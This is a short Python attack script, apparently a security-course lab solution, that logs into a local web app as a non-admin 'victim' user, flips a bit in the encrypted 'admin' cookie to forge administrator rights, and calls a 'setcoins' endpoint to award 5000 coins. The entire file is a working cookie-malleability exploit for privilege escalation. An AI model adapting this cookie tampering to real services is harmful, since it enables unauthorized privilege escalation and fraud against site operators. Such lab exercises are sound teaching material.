from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	response = sess.post(LOGIN_FORM_URL,data_dict)
	return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
	data_dict = {"username":uname,\
			"amount":str(coins),\
			}
	response = sess.post(SETCOINS_FORM_URL, data_dict)
	return response.status_code == codes.ok


def do_attack():
	sess = Session()
  	#you'll need to change this to a non-admin user, such as 'victim'.
	uname ="victim"
	pw = "victim"
	assert(do_login_form(sess, uname,pw))

	#Maul the admin cookie in the 'sess' object here  
	admin_cookie = sess.cookies.get("admin")
	# print("admin cookie hex:", admin_cookie)
	admin_cookie_bytes = bytearray.fromhex(admin_cookie)	# from hext to bytes array 
	admin_cookie_bytes[0] ^= 1                            	# set first byte to 0x01
	mauled_cookie = admin_cookie_bytes.hex()
	# print('mauled_cookie:', mauled_cookie)
 
	_domain = sess.cookies.list_domains()[0]
	_path   = sess.cookies.list_paths()[0]

	sess.cookies.set(name="admin",
					value=mauled_cookie,
					domain=_domain,
					path=_path)

 
	target_uname = uname
	amount = 5000
	result = do_setcoins_form(sess, target_uname,amount)
	print("Attack successful? " + str(result))


if __name__=='__main__':
	do_attack()
